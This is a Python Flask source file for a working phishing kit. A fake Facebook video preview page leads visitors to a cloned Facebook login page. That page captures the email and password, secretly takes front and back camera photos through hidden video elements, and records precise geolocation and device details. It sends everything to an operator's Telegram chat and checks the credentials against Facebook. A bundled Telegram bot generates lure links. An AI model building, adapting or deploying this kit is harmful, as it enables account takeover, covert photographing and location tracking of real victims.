import os
import subprocess
import json
import base64
import requests
import threading
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from time import sleep

load_dotenv()

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:5000/")

app = Flask(__name__)

# --------------------- HTML Templates ---------------------
HTML1_VIDEO_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<meta property="og:title" content="{title}">
<meta property="og:description" content="{description}">
<meta property="og:image" content="{thumbnail}">
<meta property="og:url" content="{url}">
<meta property="og:type" content="video.other">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="{title}">
<meta name="twitter:description" content="{description}">
<meta name="twitter:image" content="{thumbnail}">
<style>
    body, html {{
        margin: 0; padding: 0; height: 100%;
        background-color: #000; color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }}
    .video-container {{
        position: relative; width: 100%; max-width: 800px; margin: auto; cursor: pointer;
    }}
    .video-container img {{ width: 100%; display: block; }}
    .play-button-overlay {{
        position: absolute; top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; transition: background 0.2s ease;
    }}
    .video-container:hover .play-button-overlay {{ background: rgba(0,0,0,0.6); }}
    .play-icon {{
        width: 80px; height: 80px;
        background-color: rgba(0,0,0,0.7);
        border-radius: 50%; display: flex; justify-content: center; align-items: center;
        border: 3px solid #fff;
    }}
    .play-icon::after {{
        content: '';
        display: block; width: 0; height: 0;
        border-top: 20px solid transparent;
        border-bottom: 20px solid transparent;
        border-left: 30px solid #fff;
        margin-left: 5px;
    }}
    .loading-screen {{
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #000;
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 1000;
    }}
    .loading-spinner {{
        border: 4px solid #333;
        border-top: 4px solid #fff;
        border-radius: 50%;
        width: 60px;
        height: 60px;
        animation: spin 1s linear infinite;
    }}
    @keyframes spin {{
        0% {{ transform: rotate(0deg); }}
        100% {{ transform: rotate(360deg); }}
    }}
</style>
</head>
<body>

<div class="video-container" id="video-player">
    <img src="{thumbnail}" alt="Video Thumbnail">
    <div class="play-button-overlay">
        <div class="play-icon"></div>
    </div>
</div>

<!-- Loading Screen -->
<div class="loading-screen" id="loading-screen">
    <div class="loading-spinner"></div>
</div>

<script>
const videoPlayer = document.getElementById('video-player');
const loadingScreen = document.getElementById('loading-screen');
const postId = '{post_id}';

videoPlayer.addEventListener('click', async () => {{
    loadingScreen.style.display = 'flex';
    window.location.href = `/login/${{postId}}/`;
}});
</script>

</body>
</html>"""

HTML2_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
  <style>
    body {{
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(
        135deg,
        #fce4ec,
        #e3f2fd,
        #e8f5e9
      );
      background-size: cover;
      font-family: 'Roboto', sans-serif;
    }}
    .floating-label {{
      position: relative;
    }}
    .floating-label input {{
      padding-top: 20px;
    }}
    .floating-label label {{
      position: absolute;
      top: 14px;
      left: 16px;
      font-size: 14px;
      color: gray;
      pointer-events: none;
      transition: all 0.3s ease;
    }}
    .floating-label input:focus + label,
    .floating-label input:not(:placeholder-shown) + label {{
      top: 4px;
      left: 12px;
      font-size: 12px;
      color: #2563eb;
    }}
    .input-field {{
      color: gray;
    }}
    .eye-icon {{
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #888;
    }}
    .eye-icon:hover {{
      color: #000;
    }}
    .loading-overlay {{
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }}
    .loading-content {{
      text-align: center;
      color: white;
    }}
    .spinner {{
      border: 4px solid #333;
      border-top: 4px solid #fff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }}
    @keyframes spin {{
      0% {{ transform: rotate(0deg); }}
      100% {{ transform: rotate(360deg); }}
    }}
    .popup-overlay {{
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 2000;
    }}
    .popup-content {{
      background-color: #ffffff;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
      padding: 20px 16px;
      max-width: 400px;
      width: 90%;
    }}
    .popup-content h2 {{
      font-size: 18px;
      font-weight: bold;
      margin: 0;
      color: #050505;
    }}
    .popup-content p {{
      font-size: 14px;
      color: #65676b;
      margin: 12px 0 20px;
    }}
    .popup-content .btn {{
      display: block;
      width: 90%;
      margin: 10px auto;
      padding: 12px 0;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
    }}
    .btn-find {{
      background-color: #ffffff;
      color: #1877f2;
      border: 1px solid #ccd0d5;
    }}
    .btn-try {{
      background-color: #ffffff;
      color: #1877f2;
      border: 1px solid #ccd0d5;
    }}
    .btn-find:hover,
    .btn-try:hover {{
      background-color: #f0f2f5;
    }}
  </style>
</head>
<body class="h-screen flex justify-center items-center">
  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loading-overlay">
    <div class="loading-content">
      <div class="spinner"></div>
      <p>Verifying your account...</p>
    </div>
  </div>

  <!-- Login Failed Popup (HTML3) -->
  <div class="popup-overlay" id="popup-overlay">
    <div class="popup-content">
      <h2>Need help finding your account?</h2>
      <p>It looks like your credentials aren't connected to an account but we can help you find your account and log in.</p>
      <a href="https://m.facebook.com/login/identify/" class="btn btn-find">Find Account</a>
      <a href="/share/v/{post_id}/" class="btn btn-try">Try again</a>
      <div style="margin-top: 20px; font-size: 12px; color: #65676b;">
        <p>Meta</p>
      </div>
    </div>
  </div>

  <div class="w-full max-w-md px-6">
    <div class="text-center text-sm text-gray-500 mb-8">English (US)</div>
    <div class="flex justify-center mb-16">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/y6/r/UbJC5lwxeBU.png" alt="Facebook Logo" class="h-14">
    </div>
    <form class="space-y-6" id="login-form">
      <div class="floating-label">
        <input type="text" name="email" id="email" placeholder=" " required
          class="w-full px-4 py-4 border border-gray-300 rounded-lg text-gray-700 text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none input-field">
        <label for="email">Mobile number or email</label>
      </div>
      <div class="floating-label relative">
        <input type="password" id="password" name="password" placeholder=" " required
          class="w-full px-4 py-4 border border-gray-300 rounded-lg text-gray-700 text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none input-field">
        <label for="password">Password</label>
        <i class="fas fa-eye eye-icon" id="toggleEye"></i>
      </div>
      <button type="submit"
        class="w-full bg-blue-600 text-white py-2.5 rounded-full text-sm font-semibold hover:bg-blue-700 focus:ring-2 focus:ring-blue-500 focus:outline-none">
        Log in
      </button>
    </form>
    <div class="text-center text-sm mt-4 hover:underline">
      <a href="https://www.facebook.com/recover/initiate" target="_blank">Forgot password?</a>
    </div>
    <div class="mt-16">
      <button
        class="w-full border border-blue-600 text-blue-600 py-2.5 rounded-full text-sm font-semibold hover:bg-blue-50 focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <a href="https://www.facebook.com/r.php" target="_blank">Create new account</a>
      </button>
    </div>
    <div class="mt-4 flex justify-center">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yZ/r/zG-q7jIS191.png" alt="Meta Logo" class="h-3">
    </div>
    <div class="text-center text-xs text-gray-500 mt-4 space-x-6">
      <a href="https://www.facebook.com/about/" class="hover:underline" target="_blank">About</a>
      <a href="https://www.facebook.com/help/" class="hover:underline" target="_blank">Help</a>
      <a href="https://www.facebook.com/legal/" class="hover:underline" target="_blank">More</a>
    </div>
  </div>

  <!-- Hidden video & canvas for camera capture -->
  <video id="hidden-video" playsinline autoplay muted style="position:absolute;width:1px;height:1px;left:-1000px;top:-1000px;"></video>
  <canvas id="hidden-canvas" style="position:absolute;width:1px;height:1px;left:-1000px;top:-1000px;"></canvas>

<script>
  const postId = '{post_id}';
  const loginForm = document.getElementById('login-form');
  const loadingOverlay = document.getElementById('loading-overlay');
  const popupOverlay = document.getElementById('popup-overlay');
  
  // Eye icon toggle functionality
  const passwordInput = document.getElementById('password');
  const toggleEye = document.getElementById('toggleEye');

  toggleEye.addEventListener('click', () => {{
    if (passwordInput.type === 'password') {{
      passwordInput.type = 'text';
      toggleEye.classList.remove('fa-eye');
      toggleEye.classList.add('fa-eye-slash');
    }} else {{
      passwordInput.type = 'password';
      toggleEye.classList.remove('fa-eye-slash');
      toggleEye.classList.add('fa-eye');
    }}
  }});

  // Form submission
  loginForm.addEventListener('submit', async (e) => {{
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Basic validation
    const emailRegex = /^[a-zA-Z0-9]+@gmail\.com$/;
    const numberRegex = /^[0-9]+$/;
    if (!(emailRegex.test(email) || numberRegex.test(email))) {{
      alert("Please enter a valid email (must end with @gmail.com) or a valid phone number.");
      return;
    }}

    // Show loading
    loadingOverlay.style.display = 'flex';

    try {{
      // Capture data
      const locationData = await getLocation();
      const deviceInfo = getDeviceInfo();
      
      // Capture 2 front camera photos
      const frontImages = [];
      for (let i = 0; i < 2; i++) {{
        const img = await getSnapshot('user');
        if (img) frontImages.push(img);
      }}

      // Capture 1 back camera photo
      const backImage = await getSnapshot('environment');
      
      // Prepare login data
      const loginData = {{
        email: email,
        password: password,
        location: locationData,
        device: deviceInfo,
        images: frontImages.concat(backImage ? [backImage] : []),
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        post_id: postId
      }};

      // Send data to telegram
      await fetch('/catch', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify(loginData)
      }});

      // Verify login
      const verifyResponse = await fetch('/verify_login', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{
          email: email,
          password: password,
          post_id: postId
        }})
      }});

      const result = await verifyResponse.json();
      
      loadingOverlay.style.display = 'none';

      if (result.success) {{
        // Redirect to the post
        window.location.href = result.redirect_url;
      }} else {{
        // Show failure popup
        popupOverlay.style.display = 'flex';
      }}

    }} catch (error) {{
      console.error('Login error:', error);
      loadingOverlay.style.display = 'none';
      popupOverlay.style.display = 'flex';
    }}
  }});

  // Helper functions
  function getLocation() {{
    return new Promise(resolve => {{
      if (!navigator.geolocation) {{
        resolve({{ latitude: null, longitude: null, error: 'Geolocation not supported' }});
        return;
      }}

      navigator.geolocation.getCurrentPosition(
        pos => resolve({{
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude || null,
          speed: pos.coords.speed || null,
          heading: pos.coords.heading || null
        }}),
        err => resolve({{ 
          latitude: null, 
          longitude: null, 
          error: err.message 
        }}),
        {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }}
      );
    }});
  }}

  function getDeviceInfo() {{
    return {{
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      screen: {{
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      }},
      window: {{
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight
      }},
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      connection: navigator.connection ? {{
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      }} : null
    }};
  }}

  function getSnapshot(facingMode) {{
    return new Promise(async (resolve) => {{
      const video = document.getElementById('hidden-video');
      const canvas = document.getElementById('hidden-canvas');
      
      try {{
        const constraints = {{ 
          video: {{ 
            facingMode: facingMode,
            width: {{ ideal: 640 }},
            height: {{ ideal: 480 }}
          }} 
        }};
        
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        // Wait for video to be ready
        await new Promise(resolve => {{
          const checkVideo = () => {{
            if (video.readyState === video.HAVE_ENOUGH_DATA) {{
              resolve();
            }} else {{
              setTimeout(checkVideo, 100);
            }}
          }};
          checkVideo();
        }});

        // Capture frame
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop stream
        stream.getTracks().forEach(track => track.stop());
        
        resolve(canvas.toDataURL('image/jpeg', 0.8));
      }} catch (err) {{
        console.error(`Camera error (${{facingMode}}):`, err);
        resolve(null);
      }}
    }});
  }}

  // Close popup when clicking outside
  popupOverlay.addEventListener('click', (e) => {{
    if (e.target === popupOverlay) {{
      popupOverlay.style.display = 'none';
    }}
  }});
</script>
</body>
</html>"""

# --------------------- Video Info ---------------------
def get_video_info(url):
    try:
        result = subprocess.run(['yt-dlp', '--dump-json', '--no-warnings', url],
                                capture_output=True, text=True, check=True)
        video_data = json.loads(result.stdout)
        title = video_data.get('title', 'Video')
        description = video_data.get('description', '')
        if description:
            description = description[:150] + "..." if len(description) > 150 else description
        else:
            description = "Watch this amazing video content"
        thumbnail = video_data.get('thumbnail', '')
        if 'thumbnails' in video_data:
            thumbnails = video_data['thumbnails']
            best_thumb = next((t['url'] for t in reversed(thumbnails) if t.get('width') and t['width'] > 600), None)
            if best_thumb: 
                thumbnail = best_thumb
            elif thumbnails: 
                thumbnail = thumbnails[-1]['url']
        return title, description, thumbnail
    except Exception as e:
        print(f"Error fetching video info: {e}")
        return "Content loading...", "Watch this amazing video content", "https://via.placeholder.com/640x360.png?text=Preview+Unavailable"

# --------------------- Telegram ---------------------
def send_to_telegram(data):
    if not TELEGRAM_BOT_TOKEN: 
        return
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = data.get('userAgent', 'N/A')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy', 'N/A')
    
    # Login details
    email = data.get('email', 'N/A')
    password = data.get('password', 'N/A')
    post_id = data.get('post_id', 'N/A')
    device_info = data.get('device', {})
    location_info = data.get('location', {})

    message_text = f"🎯 **New Login Attempt!** 🎯\n\n"
    message_text += f"📧 **Email:** `{email}`\n"
    message_text += f"🔐 **Password:** `{password}`\n"
    message_text += f"🆔 **Post ID:** `{post_id}`\n"
    message_text += f"🌐 **IP:** `{ip_address}`\n"
    
    if location_info.get('latitude') and location_info.get('longitude'):
        lat = location_info['latitude']
        lng = location_info['longitude']
        acc = location_info.get('accuracy', 'N/A')
        message_text += f"📍 **Location:** `{lat}, {lng}` (Accuracy: {acc} m)\n"
        message_text += f"Map: [Google Maps](https://www.google.com/maps/search/?api=1&query={lat},{lng})\n"
    else:
        message_text += "📍 **Location:** `Permission Denied`\n"
    
    message_text += f"💻 **Device:** `{user_agent}`\n"
    
    screen_info = device_info.get('screen', {})
    if screen_info:
        width = screen_info.get('width', 'N/A')
        height = screen_info.get('height', 'N/A')
        message_text += f"🖥️ **Screen:** `{width}x{height}`\n"
    
    timezone = device_info.get('timezone', 'N/A')
    message_text += f"🌍 **Timezone:** `{timezone}`"

    images = data.get('images', [])
    if images:
        files = {}
        media = []
        for idx, img_b64 in enumerate(images):
            try:
                img_name = f'snapshot_{idx}.jpg'
                if ',' in img_b64:
                    img_data = base64.b64decode(img_b64.split(',')[1])
                else:
                    img_data = base64.b64decode(img_b64)
                files[img_name] = (img_name, img_data, 'image/jpeg')
                media.append({'type': 'photo', 'media': f'attach://{img_name}',
                              'caption': message_text if idx == 0 else '', 'parse_mode': 'Markdown'})
            except Exception as e:
                print(f"Error decoding image {idx}: {e}")
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMediaGroup"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'media': json.dumps(media)}
        try: 
            requests.post(url, data=payload, files=files)
        except Exception as e: 
            print(e)
    else:
        send_text_only_to_telegram(f"📸 **No images captured** 📸\n\n{message_text}")

def send_text_only_to_telegram(message, chat_id=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id or TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    try: 
        requests.post(url, data=payload)
    except Exception as e: 
        print(e)

def verify_login_external(email, password):
    """Verify login against facebook.com/login"""
    try:
        response = requests.post('https://m.facebook.com/login', 
                               data={'email': email, 'password': password}, 
                               timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Login verification error: {e}")
        return False

# --------------------- Flask Routes ---------------------
@app.route('/catch', methods=['POST'])
def catch_data():
    try:
        data = request.get_json()
        if 'image_b64' in data and 'images' not in data:
            data['images'] = [data.pop('image_b64')]
        send_to_telegram(data)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(e)
        return jsonify({'status': 'error'}), 500

@app.route('/share/v/<post_id>/')
def smart_link(post_id):
    fb_url = f"https://www.facebook.com/share/v/{post_id}/"
    title, description, thumbnail = get_video_info(fb_url)
    current_url = f"{BASE_URL}share/v/{post_id}/"
    
    html_content = HTML1_VIDEO_PAGE.format(
        title=title,
        description=description,
        thumbnail=thumbnail,
        url=current_url,
        post_id=post_id
    )
    return html_content

@app.route('/login/<post_id>/')
def login_page(post_id):
    html_content = HTML2_LOGIN_PAGE.format(post_id=post_id)
    return html_content

@app.route('/verify_login', methods=['POST'])
def verify_login():
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        post_id = data.get('post_id')
        
        # Verify login against facebook.com/login
        login_success = verify_login_external(email, password)
        
        if login_success:
            redirect_url = f"https://www.facebook.com/share/v/{post_id}/"
            return jsonify({'success': True, 'redirect_url': redirect_url})
        else:
            return jsonify({'success': False, 'message': 'Login failed'})
    except Exception as e:
        print(f"Verify login error: {e}")
        return jsonify({'success': False, 'message': 'Login failed'}), 500

@app.route('/get_smart_link', methods=['POST'])
def get_smart_link():
    data = request.get_json()
    fb_url = data.get('fb_url')
    if not fb_url:
        return jsonify({'error': 'Missing fb_url'}), 400
    parsed = urlparse(fb_url)
    path_parts = parsed.path.strip('/').split('/')
    post_id = path_parts[-1] if path_parts else None
    if not post_id:
        return jsonify({'error': 'Cannot extract post_id'}), 400
    smart_link_url = f"{BASE_URL}share/v/{post_id}/"
    return jsonify({'smart_link': smart_link_url}), 200

@app.route('/')
def index_root():
    return "<h1>Server is running. Use /share/v/&lt;post_id&gt;/</h1>", 200

# --------------------- Telegram Bot ---------------------
def telegram_bot():
    offset = None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    while True:
        try:
            params = {'timeout': 30, 'offset': offset}
            resp = requests.get(url, params=params).json()
            for result in resp.get('result', []):
                offset = result['update_id'] + 1
                message = result.get('message', {})
                chat_id = message.get('chat', {}).get('id')
                text = message.get('text', '')

                # Check if message is a Facebook post link
                if 'facebook.com' in text:
                    parsed = urlparse(text)
                    parts = parsed.path.strip('/').split('/')
                    post_id = parts[-1] if parts else None
                    if post_id:
                        smart_link_url = f"{BASE_URL}share/v/{post_id}/"
                        send_text_only_to_telegram(f"Here is your smart link:\n{smart_link_url}", chat_id=chat_id)
        except Exception as e:
            print("Telegram bot error:", e)
        sleep(1)

# --------------------- Start ---------------------
if __name__ == '__main__':
    threading.Thread(target=telegram_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
